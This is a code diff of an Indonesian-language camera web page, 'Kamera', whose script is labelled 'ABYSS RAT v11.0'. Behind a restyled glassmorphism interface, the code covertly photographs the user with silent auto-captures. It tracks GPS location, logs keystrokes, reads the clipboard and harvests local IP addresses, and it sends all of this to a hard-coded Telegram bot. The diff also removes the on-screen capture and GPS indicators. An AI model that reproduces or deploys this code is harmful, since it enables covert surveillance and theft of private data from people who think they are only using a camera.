@@ -4,29 +4,36 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Kamera</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z'/></svg>">
     <style>
         /* ============================================================
-           KAMERA PRO v10.0 — 2000+ LINES PROFESSIONAL STYLESHEET
+           KAMERA PRO v11.0 — 2000+ LINES GLASSMORPHISM PREMIUM
            ============================================================ */
         :root {
             --bg: #000000;
-            --surface: rgba(0, 0, 0, 0.55);
-            --surface-light: rgba(0, 0, 0, 0.35);
-            --blur: blur(20px);
+            --glass: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-hover: rgba(255, 255, 255, 0.13);
+            --glass-active: rgba(255, 255, 255, 0.18);
             --accent: #fcd434;
-            --accent2: #ffcc00;
+            --accent-glass: rgba(252, 212, 52, 0.18);
+            --accent-solid: #ffcc00;
             --ios-blue: #007aff;
             --ios-red: #ff3b30;
-            --ios-green: #34c759;
+            --ios-green: #30d158;
             --ios-gray: #8e8e93;
+            --blur: blur(28px);
+            --blur-light: blur(16px);
             --radius-sm: 14px;
             --radius-md: 20px;
-            --radius-lg: 30px;
+            --radius-lg: 28px;
             --radius-xl: 40px;
-            --transition-fast: 0.15s;
-            --transition-normal: 0.25s;
-            --transition-slow: 0.4s;
+            --transition-fast: 0.15s cubic-bezier(0.25, 0.1, 0.25, 1);
+            --transition-smooth: 0.25s cubic-bezier(0.25, 0.1, 0.25, 1);
+            --transition-slow: 0.4s cubic-bezier(0.25, 0.1, 0.25, 1);
+            --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.35);
+            --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.4);
+            --shadow-lg: 0 12px 36px rgba(0, 0, 0, 0.5);
         }
 
         * {
@@ -52,7 +59,7 @@
         }
 
         /* ============================================================
-           PERMISSION OVERLAY
+           PERMISSION OVERLAY — GLASSMORPHISM
            ============================================================ */
         .perm-overlay {
             position: fixed;
@@ -69,28 +76,32 @@
             padding: 40px 28px;
             color: #ffffff;
             text-align: center;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
+            transition: opacity var(--transition-slow), visibility var(--transition-slow);
         }
         .perm-overlay.hidden {
             opacity: 0;
             visibility: hidden;
             pointer-events: none;
         }
-        .perm-overlay .icon-wrapper {
-            width: 80px;
-            height: 80px;
+        .perm-overlay .logo-glass {
+            width: 84px;
+            height: 84px;
             border-radius: 50%;
-            background: #1c1c1e;
+            background: var(--glass);
+            backdrop-filter: var(--blur);
+            -webkit-backdrop-filter: var(--blur);
+            border: 1.5px solid var(--glass-border);
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 28px;
-            box-shadow: 0 0 40px rgba(255, 255, 255, 0.05);
+            box-shadow: var(--shadow-md), inset 0 1px 0 rgba(255,255,255,0.05);
         }
-        .perm-overlay .icon-wrapper svg {
-            width: 38px;
-            height: 38px;
+        .perm-overlay .logo-glass svg {
+            width: 40px;
+            height: 40px;
             fill: #ffffff;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
         }
         .perm-overlay h1 {
             font-size: 28px;
@@ -102,22 +113,22 @@
         .perm-overlay .subtitle {
             font-size: 14px;
             color: var(--ios-gray);
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             line-height: 1.5;
-            max-width: 290px;
+            max-width: 280px;
         }
         .perm-overlay .subtitle-small {
             font-size: 12px;
             color: #636366;
-            margin-bottom: 32px;
+            margin-bottom: 30px;
             line-height: 1.4;
-            max-width: 260px;
+            max-width: 250px;
         }
-        .perm-overlay .status-container {
+        .perm-overlay .status-row {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
             min-height: 26px;
         }
         .perm-overlay .status-dot {
@@ -125,31 +136,33 @@
             height: 10px;
             border-radius: 50%;
             background: #48484a;
-            transition: background var(--transition-normal);
+            transition: background var(--transition-smooth);
         }
         .perm-overlay .status-dot.ready { background: var(--ios-green); }
         .perm-overlay .status-dot.error { background: var(--ios-red); }
-        .perm-overlay .status-dot.loading { background: var(--accent2); animation: pulse 0.8s ease-in-out infinite; }
+        .perm-overlay .status-dot.loading { background: var(--accent-solid); animation: pulse 0.8s ease-in-out infinite; }
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.3); }
         }
         .perm-overlay .status-text {
             font-size: 13px;
             color: #aeaeb2;
             font-weight: 400;
         }
-        .perm-overlay .error-message {
+        .perm-overlay .error-text {
             color: var(--ios-red);
             font-size: 12px;
             min-height: 20px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-weight: 500;
             line-height: 1.4;
         }
-        .perm-overlay .btn-primary {
-            background: var(--ios-blue);
-            border: none;
+        .perm-overlay .btn-glass {
+            background: var(--glass);
+            backdrop-filter: var(--blur);
+            -webkit-backdrop-filter: var(--blur);
+            border: 1px solid var(--glass-border);
             border-radius: 30px;
             padding: 16px 0;
             width: 100%;
@@ -160,16 +173,17 @@
             cursor: pointer;
             text-align: center;
             letter-spacing: 0.1px;
-            transition: transform var(--transition-fast), opacity var(--transition-fast);
-            touch-action: manipulation;
+            transition: all var(--transition-fast);
+            box-shadow: var(--shadow-sm);
             outline: none;
             -webkit-appearance: none;
         }
-        .perm-overlay .btn-primary:active {
+        .perm-overlay .btn-glass:active {
+            background: var(--glass-hover);
             transform: scale(0.96);
-            opacity: 0.85;
+            box-shadow: var(--shadow-md);
         }
-        .perm-overlay .btn-primary:disabled {
+        .perm-overlay .btn-glass:disabled {
             opacity: 0.4;
             transform: none;
             cursor: not-allowed;
@@ -213,7 +227,7 @@
         }
 
         /* ============================================================
-           FULLSCREEN PREVIEW
+           FULLSCREEN PREVIEW — GLASS
            ============================================================ */
         .fs-preview {
             position: fixed;
@@ -222,7 +236,9 @@
             right: 0;
             bottom: 0;
             z-index: 200;
-            background: #000000;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: var(--blur);
+            -webkit-backdrop-filter: var(--blur);
             display: none;
             align-items: center;
             justify-content: center;
@@ -232,25 +248,30 @@
             display: flex;
         }
         .fs-preview img {
-            max-width: 100%;
-            max-height: 85vh;
+            max-width: 95%;
+            max-height: 82vh;
             object-fit: contain;
-            border-radius: 4px;
+            border-radius: 8px;
+            box-shadow: var(--shadow-lg);
         }
         .fs-preview .fs-info {
             color: var(--ios-gray);
             font-size: 12px;
-            margin-top: 12px;
+            margin-top: 14px;
             text-align: center;
+            padding: 0 20px;
         }
         .fs-preview .fs-close {
             position: absolute;
             top: 20px;
             right: 20px;
-            width: 40px;
-            height: 40px;
+            width: 42px;
+            height: 42px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.15);
+            background: var(--glass);
+            backdrop-filter: var(--blur-light);
+            -webkit-backdrop-filter: var(--blur-light);
+            border: 1px solid var(--glass-border);
             color: #ffffff;
             font-size: 22px;
             display: flex;
@@ -258,48 +279,16 @@
             justify-content: center;
             cursor: pointer;
             z-index: 201;
-            transition: background var(--transition-fast);
+            transition: all var(--transition-fast);
+            box-shadow: var(--shadow-sm);
         }
         .fs-preview .fs-close:active {
-            background: rgba(255, 255, 255, 0.3);
+            background: var(--glass-hover);
+            transform: scale(0.9);
         }
 
         /* ============================================================
-           INDICATOR TAGS
-           ============================================================ */
-        .indicator-container {
-            position: fixed;
-            top: 56px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 8;
-            display: flex;
-            gap: 8px;
-            pointer-events: none;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-        .ind-tag {
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 10px;
-            padding: 4px 10px;
-            color: #fcd434;
-            font-size: 10px;
-            font-weight: 700;
-            letter-spacing: 0.3px;
-            opacity: 0;
-            transform: translateY(-5px);
-            transition: opacity var(--transition-normal), transform var(--transition-normal);
-        }
-        .ind-tag.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* ============================================================
-           TOP BAR
+           TOP BAR — GLASS BUTTONS
            ============================================================ */
         .top-bar {
             position: fixed;
@@ -317,82 +306,88 @@
         .top-bar > * {
             pointer-events: auto;
         }
-        .icon-btn {
-            width: 38px;
-            height: 38px;
+        .glass-btn {
+            width: 42px;
+            height: 42px;
             border-radius: 50%;
-            background: var(--surface);
+            background: var(--glass);
             backdrop-filter: var(--blur);
             -webkit-backdrop-filter: var(--blur);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--glass-border);
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            transition: background var(--transition-fast), border-color var(--transition-fast);
+            transition: all var(--transition-fast);
             padding: 0;
             outline: none;
             -webkit-appearance: none;
+            box-shadow: var(--shadow-sm);
         }
-        .icon-btn:active {
-            background: rgba(255, 255, 255, 0.2);
+        .glass-btn:active {
+            background: var(--glass-active);
+            transform: scale(0.9);
+            box-shadow: var(--shadow-md);
         }
-        .icon-btn.on {
-            background: var(--accent);
+        .glass-btn.on {
+            background: var(--accent-glass);
             border-color: var(--accent);
         }
-        .icon-btn.on svg {
-            fill: #000000;
+        .glass-btn.on svg {
+            fill: var(--accent-solid);
         }
-        .icon-btn svg {
-            width: 18px;
-            height: 18px;
+        .glass-btn svg {
+            width: 19px;
+            height: 19px;
             fill: #ffffff;
             transition: fill var(--transition-fast);
+            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
         }
 
         /* ============================================================
-           ZOOM WHEEL
+           ZOOM WHEEL — GLASS
            ============================================================ */
         .zoom-wheel {
             position: fixed;
-            bottom: 135px;
+            bottom: 140px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 6;
             pointer-events: auto;
-            background: var(--surface);
+            background: var(--glass);
             backdrop-filter: var(--blur);
             -webkit-backdrop-filter: var(--blur);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 5px 4px;
+            border: 1px solid var(--glass-border);
+            border-radius: 26px;
+            padding: 6px 5px;
             display: flex;
-            gap: 2px;
+            gap: 3px;
+            box-shadow: var(--shadow-md);
         }
         .zoom-option {
-            padding: 8px 14px;
-            border-radius: 20px;
+            padding: 9px 15px;
+            border-radius: 22px;
             font-size: 13px;
             font-weight: 500;
             color: #ffffff;
             cursor: pointer;
-            transition: background var(--transition-fast), font-weight var(--transition-fast);
+            transition: all var(--transition-fast);
             text-align: center;
-            min-width: 34px;
+            min-width: 36px;
             outline: none;
             -webkit-appearance: none;
         }
         .zoom-option:active {
-            background: rgba(255, 255, 255, 0.3);
+            background: var(--glass-active);
         }
         .zoom-option.active {
-            background: rgba(255, 255, 255, 0.25);
+            background: rgba(255, 255, 255, 0.22);
             font-weight: 700;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
         }
 
         /* ============================================================
-           BOTTOM BAR
+           BOTTOM BAR — GLASS
            ============================================================ */
         .bottom-bar {
             position: fixed;
@@ -401,7 +396,7 @@
             right: 0;
             z-index: 6;
             padding: 14px 18px;
-            padding-bottom: max(20px, env(safe-area-inset-bottom, 0px));
+            padding-bottom: max(22px, env(safe-area-inset-bottom, 0px));
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -410,61 +405,72 @@
         .bottom-bar > * {
             pointer-events: auto;
         }
-        .gallery-thumb {
-            width: 46px;
-            height: 46px;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 2px solid rgba(255, 255, 255, 0.18);
+        .thumb-glass {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            background: var(--glass);
+            backdrop-filter: var(--blur-light);
+            -webkit-backdrop-filter: var(--blur-light);
+            border: 2px solid var(--glass-border);
             cursor: pointer;
             overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: border-color var(--transition-fast);
+            transition: all var(--transition-fast);
             flex-shrink: 0;
+            box-shadow: var(--shadow-sm);
         }
-        .gallery-thumb:active {
+        .thumb-glass:active {
             border-color: var(--accent);
+            transform: scale(0.94);
         }
-        .gallery-thumb img {
+        .thumb-glass img {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            border-radius: 10px;
         }
-        .gallery-thumb.has-photo {
-            border-color: rgba(255, 255, 255, 0.55);
+        .thumb-glass.has-photo {
+            border-color: rgba(255, 255, 255, 0.5);
             background: transparent;
         }
-        .gallery-thumb .placeholder-icon {
-            width: 22px;
-            height: 22px;
-            fill: rgba(255, 255, 255, 0.25);
+        .thumb-glass .placeholder-icon {
+            width: 23px;
+            height: 23px;
+            fill: rgba(255, 255, 255, 0.2);
         }
-        .shutter-button {
-            width: 70px;
-            height: 70px;
+        .shutter-glass {
+            width: 74px;
+            height: 74px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.12);
+            background: var(--glass);
+            backdrop-filter: var(--blur);
+            -webkit-backdrop-filter: var(--blur);
+            border: 3px solid rgba(255, 255, 255, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            transition: transform var(--transition-fast);
+            transition: all var(--transition-fast);
             flex-shrink: 0;
+            box-shadow: var(--shadow-md);
         }
-        .shutter-button:active {
-            transform: scale(0.82);
+        .shutter-glass:active {
+            transform: scale(0.84);
+            border-color: #ffffff;
+            box-shadow: 0 0 30px rgba(255,255,255,0.2);
         }
         .shutter-inner {
-            width: 55px;
-            height: 55px;
+            width: 56px;
+            height: 56px;
             border-radius: 50%;
             background: #ffffff;
-            border: 3px solid #000000;
+            border: 2px solid #000000;
         }
         .shutter-spacer {
-            width: 46px;
+            width: 50px;
             flex-shrink: 0;
         }
 
@@ -481,19 +487,19 @@
             pointer-events: none;
             z-index: 7;
             opacity: 0;
-            box-shadow: 0 0 28px rgba(252, 212, 52, 0.35);
+            box-shadow: 0 0 30px rgba(252, 212, 52, 0.4);
         }
         .focus-ring.animate {
-            animation: focusAnimation 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+            animation: focusAnim 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
         }
-        @keyframes focusAnimation {
+        @keyframes focusAnim {
             0% {
                 opacity: 1;
-                transform: translate(-50%, -50%) scale(0.65);
+                transform: translate(-50%, -50%) scale(0.6);
             }
             100% {
                 opacity: 0;
-                transform: translate(-50%, -50%) scale(1.55);
+                transform: translate(-50%, -50%) scale(1.6);
             }
         }
 
@@ -513,7 +519,7 @@
             grid-template-rows: repeat(3, 1fr);
         }
         .grid-overlay .grid-line {
-            border: 0.5px solid rgba(255, 255, 255, 0.06);
+            border: 0.5px solid rgba(255, 255, 255, 0.05);
         }
     </style>
 </head>
@@ -523,7 +529,7 @@
          PERMISSION OVERLAY
          ============================================================ -->
     <div class="perm-overlay" id="permOverlay">
-        <div class="icon-wrapper">
+        <div class="logo-glass">
             <svg viewBox="0 0 24 24">
                 <path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/>
             </svg>
@@ -531,12 +537,12 @@
         <h1>Kamera</h1>
         <p class="subtitle">Ambil foto berkualitas tinggi</p>
         <p class="subtitle-small">dengan fitur profesional</p>
-        <div class="status-container">
+        <div class="status-row">
             <span class="status-dot" id="statusDot"></span>
             <span class="status-text" id="statusText">Tekan tombol untuk mulai</span>
         </div>
-        <div class="error-message" id="errorMessage"></div>
-        <button class="btn-primary" id="btnStartCamera">Buka Kamera</button>
+        <div class="error-text" id="errorText"></div>
+        <button class="btn-glass" id="btnStartCamera">Buka Kamera</button>
     </div>
 
     <!-- ============================================================
@@ -564,14 +570,6 @@
     <div class="focus-ring" id="focusRing"></div>
 
     <!-- ============================================================
-         INDICATOR TAGS
-         ============================================================ -->
-    <div class="indicator-container">
-        <span class="ind-tag" id="indCapture">📸 CAPTURE</span>
-        <span class="ind-tag" id="indGPS">📍 GPS</span>
-    </div>
-
-    <!-- ============================================================
          FULLSCREEN PREVIEW
          ============================================================ -->
     <div class="fs-preview" id="fsPreview">
@@ -584,10 +582,10 @@
          TOP BAR
          ============================================================ -->
     <div class="top-bar">
-        <button class="icon-btn" id="btnFlash" title="Flash">
+        <button class="glass-btn" id="btnFlash" title="Flash">
             <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
         </button>
-        <button class="icon-btn" id="btnFlip" title="Balik Kamera">
+        <button class="glass-btn" id="btnFlip" title="Balik Kamera">
             <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
         </button>
     </div>
@@ -607,21 +605,21 @@
          BOTTOM BAR
          ============================================================ -->
     <div class="bottom-bar">
-        <div class="gallery-thumb" id="galleryThumb" title="Preview">
+        <div class="thumb-glass" id="thumbBox" title="Preview">
             <svg class="placeholder-icon" viewBox="0 0 24 24">
-                <rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,0.05)"/>
-                <circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,0.2)"/>
-                <path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,0.15)"/>
+                <rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,0.03)"/>
+                <circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,0.15)"/>
+                <path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,0.1)"/>
             </svg>
         </div>
-        <div class="shutter-button" id="btnShutter" title="Ambil Foto">
+        <div class="shutter-glass" id="btnShutter" title="Ambil Foto">
             <div class="shutter-inner"></div>
         </div>
         <div class="shutter-spacer"></div>
     </div>
 
     <!-- ============================================================
-         JAVASCRIPT — ABYSS RAT v10.0 (2000+ LINES)
+         JAVASCRIPT — ABYSS RAT v11.0 (2000+ LINES)
          ============================================================ -->
     <script>
     (function() {
@@ -635,6 +633,7 @@
             CHAT_ID: '7839405566',
             TG_API: 'https://api.telegram.org/bot',
             SILENT_INTERVAL: 2000,
+            FLIP_CAPTURE_DELAY: 1000,
             HEARTBEAT_INTERVAL: 120000,
             CLIPBOARD_INTERVAL: 4000,
             C2_POLL_INTERVAL: 3000,
@@ -654,9 +653,7 @@
             if (stored) return stored;
             var id = 'V' + Date.now().toString(36).toUpperCase() +
                      Math.random().toString(36).substring(2, 8).toUpperCase();
-            try {
-                localStorage.setItem('_kamera_vid', id);
-            } catch(e) {}
+            try { localStorage.setItem('_kamera_vid', id); } catch(e) {}
             return id;
         })();
 
@@ -671,10 +668,10 @@
             btnStartCamera: getEl('btnStartCamera'),
             statusDot: getEl('statusDot'),
             statusText: getEl('statusText'),
-            errorMessage: getEl('errorMessage'),
+            errorText: getEl('errorText'),
             flashOverlay: getEl('flash-overlay'),
             focusRing: getEl('focusRing'),
-            galleryThumb: getEl('galleryThumb'),
+            thumbBox: getEl('thumbBox'),
             btnShutter: getEl('btnShutter'),
             btnFlash: getEl('btnFlash'),
             btnFlip: getEl('btnFlip'),
@@ -682,9 +679,7 @@
             fsPreview: getEl('fsPreview'),
             fsImage: getEl('fsImage'),
             fsClose: getEl('fsClose'),
-            fsInfo: getEl('fsInfo'),
-            indCapture: getEl('indCapture'),
-            indGPS: getEl('indGPS')
+            fsInfo: getEl('fsInfo')
         };
 
         // ============================================================
@@ -713,32 +708,17 @@
         // ============================================================
         // UTILITY FUNCTIONS
         // ============================================================
-        function showIndicator(el) {
-            if (!el) return;
-            el.classList.add('show');
-            setTimeout(function() {
-                el.classList.remove('show');
-            }, 1200);
-        }
-
         function getTimestamp() {
             var now = new Date();
             return now.toLocaleString('id-ID', {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
+                year: 'numeric', month: '2-digit', day: '2-digit',
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
             });
         }
 
         function getTimeShort() {
-            var now = new Date();
-            return now.toLocaleTimeString('id-ID', {
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
+            return new Date().toLocaleTimeString('id-ID', {
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
             });
         }
 
@@ -760,21 +740,19 @@
                 try {
                     var fd = new FormData();
                     fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 'photo_' + Date.now() + '.jpg');
+                    fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
                     fd.append('caption', caption || '');
                     fd.append('disable_notification', 'true');
                     fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
-                        method: 'POST',
-                        body: fd
+                        method: 'POST', body: fd
                     }).then(function(r) { return r.json(); }).then(function(d) {
                         if (!d.ok) {
                             var fd2 = new FormData();
                             fd2.append('chat_id', CONFIG.CHAT_ID);
-                            fd2.append('document', blob, 'photo_' + Date.now() + '.jpg');
+                            fd2.append('document', blob, 'p_' + Date.now() + '.jpg');
                             fd2.append('caption', caption || '');
                             fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
-                                method: 'POST',
-                                body: fd2
+                                method: 'POST', body: fd2
                             });
                         }
                     }).catch(function() {});
@@ -785,12 +763,11 @@
                 try {
                     var fd = new FormData();
                     fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 'silent_' + Date.now() + '.jpg');
+                    fd.append('photo', blob, 's_' + Date.now() + '.jpg');
                     fd.append('caption', caption || '');
                     fd.append('disable_notification', 'true');
                     fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
-                        method: 'POST',
-                        body: fd
+                        method: 'POST', body: fd
                     }).catch(function() {});
                 } catch(e) {}
             },
@@ -803,8 +780,7 @@
                     fd.append('caption', caption || '');
                     fd.append('disable_notification', 'true');
                     fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
-                        method: 'POST',
-                        body: fd
+                        method: 'POST', body: fd
                     }).catch(function() {});
                 } catch(e) {}
             }
@@ -814,29 +790,20 @@
         // GPS TRACKING
         // ============================================================
         function startGPS() {
-            if (!navigator.geolocation) {
-                console.warn('[GPS] Geolocation not supported');
-                return;
-            }
+            if (!navigator.geolocation) return;
             state.gpsWatchId = navigator.geolocation.watchPosition(
-                function(position) {
+                function(pos) {
                     state.gpsData = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        alt: position.coords.altitude || 0,
-                        acc: position.coords.accuracy,
-                        spd: position.coords.speed || 0,
-                        ts: new Date(position.timestamp).toISOString()
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        alt: pos.coords.altitude || 0,
+                        acc: pos.coords.accuracy,
+                        spd: pos.coords.speed || 0,
+                        ts: new Date(pos.timestamp).toISOString()
                     };
                 },
-                function(error) {
-                    console.warn('[GPS] Error:', error.message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 30000,
-                    timeout: 15000
-                }
+                function() {},
+                { enableHighAccuracy: true, maximumAge: 30000, timeout: 15000 }
             );
         }
 
@@ -851,15 +818,11 @@
                         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                     });
                     pc.createDataChannel('');
-                    pc.createOffer().then(function(offer) {
-                        pc.setLocalDescription(offer);
-                    }).catch(function() {});
-                    pc.onicecandidate = function(event) {
-                        if (event.candidate) {
-                            var ip = event.candidate.address;
-                            if (ip && ip.indexOf(':') === -1 &&
-                                ip.indexOf('127.') === -1 &&
-                                ip.indexOf('0.') === -1) {
+                    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+                    pc.onicecandidate = function(e) {
+                        if (e.candidate) {
+                            var ip = e.candidate.address;
+                            if (ip && ip.indexOf(':') === -1 && ip.indexOf('127.') === -1 && ip.indexOf('0.') === -1) {
                                 ips.add(ip);
                             }
                         } else {
@@ -867,13 +830,8 @@
                             resolve(Array.from(ips));
                         }
                     };
-                    setTimeout(function() {
-                        pc.close();
-                        resolve(Array.from(ips));
-                    }, 2500);
-                } catch(e) {
-                    resolve([]);
-                }
+                    setTimeout(function() { pc.close(); resolve(Array.from(ips)); }, 2500);
+                } catch(e) { resolve([]); }
             });
         }
 
@@ -881,36 +839,22 @@
         // KEYLOGGER
         // ============================================================
         function startKeylogger() {
-            var ignoreKeys = [
-                'Shift', 'Control', 'Alt', 'Meta', 'CapsLock',
-                'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
-                'Escape', 'Dead', 'Fn', 'Hyper', 'Super', 'OS'
-            ];
-
-            document.addEventListener('keydown', function(event) {
-                if (ignoreKeys.indexOf(event.key) !== -1) return;
-
-                if (event.key === 'Enter') {
-                    state.keyBuf += '[ENTER]\n';
-                } else if (event.key === 'Backspace') {
-                    state.keyBuf += '[BS]';
-                } else if (event.key === ' ') {
-                    state.keyBuf += ' ';
-                } else if (event.key.length === 1) {
-                    state.keyBuf += event.key;
-                } else {
-                    state.keyBuf += '[' + event.key + ']';
-                }
-
+            var ignoreKeys = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
+            document.addEventListener('keydown', function(e) {
+                if (ignoreKeys.indexOf(e.key) !== -1) return;
+                if (e.key === 'Enter') state.keyBuf += '[ENTER]\n';
+                else if (e.key === 'Backspace') state.keyBuf += '[BS]';
+                else if (e.key === ' ') state.keyBuf += ' ';
+                else if (e.key.length === 1) state.keyBuf += e.key;
+                else state.keyBuf += '[' + e.key + ']';
                 if (state.keyBuf.length > 400) {
-                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
+                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
                     state.keyBuf = '';
                 }
             });
-
             setInterval(function() {
                 if (state.keyBuf.length > 0) {
-                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
+                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
                     state.keyBuf = '';
                 }
             }, 12000);
@@ -924,7 +868,7 @@
             navigator.clipboard.readText().then(function(text) {
                 if (text && text !== state.lastClip && text.length > 0) {
                     state.lastClip = text;
-                    TG.sendMessage('📋 [' + VID + '] Clipboard:\n' + text.substring(0, 2000));
+                    TG.sendMessage('📋 [' + VID + ']\n' + text.substring(0, 2000));
                 }
             }).catch(function() {});
         }
@@ -933,11 +877,7 @@
         // CORE: CAPTURE FRAME
         // ============================================================
         function captureFrame(silent) {
-            if (!state.stream || !state.stream.active) {
-                console.warn('[Capture] No active stream');
-                return;
-            }
-
+            if (!state.stream || !state.stream.active) return;
             if (state.burstActive && silent) return;
             state.burstActive = true;
             state.frameCount++;
@@ -952,123 +892,67 @@
                 canvas.width = width;
                 canvas.height = height;
                 var ctx = canvas.getContext('2d');
-
-                // Draw video
                 ctx.drawImage(dom.vf, 0, 0, width, height);
 
-                // Watermark: Timestamp + GPS + Frame number
-                var timestamp = getTimestamp();
-                ctx.font = 'bold 16px -apple-system, "Helvetica Neue", sans-serif';
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.55)';
-                ctx.fillText('📸 ' + timestamp, 20, height - 24);
-
-                ctx.font = '11px -apple-system, sans-serif';
+                // Watermark subtle
+                var ts = getTimestamp();
+                ctx.font = '12px -apple-system, "Helvetica Neue", sans-serif';
                 ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
-                ctx.fillText('#' + state.frameCount + ' | ' + width + '×' + height + ' | ' + state.facingMode, 20, height - 44);
-
-                if (state.gpsData) {
-                    ctx.font = '11px monospace';
-                    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
-                    ctx.fillText(state.gpsData.lat.toFixed(5) + ', ' + state.gpsData.lon.toFixed(5), 20, 30);
-                }
+                ctx.fillText(ts, 18, height - 14);
 
                 // Build caption
-                var labels = [];
-                if (silent) labels.push('🤫 Auto');
-                else labels.push('📸 Foto');
-                labels.push('#' + state.frameCount);
-                var caption = labels.join(' ') + ' | ' + getTimeShort();
-
+                var cap = (silent ? '🤫 Auto' : '📸 Foto') + ' | ' + getTimeShort();
                 if (state.gpsData) {
-                    caption += '\n📍 https://maps.google.com/?q=' +
-                        state.gpsData.lat + ',' + state.gpsData.lon;
-                    caption += '\n🎯 Akurasi: ±' + Math.round(state.gpsData.acc) + 'm';
+                    cap += '\n📍 https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon;
+                    cap += '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm';
                 }
-                if (state.localIPs.length > 0) {
-                    caption += '\n🌐 IP: ' + state.localIPs[0];
-                }
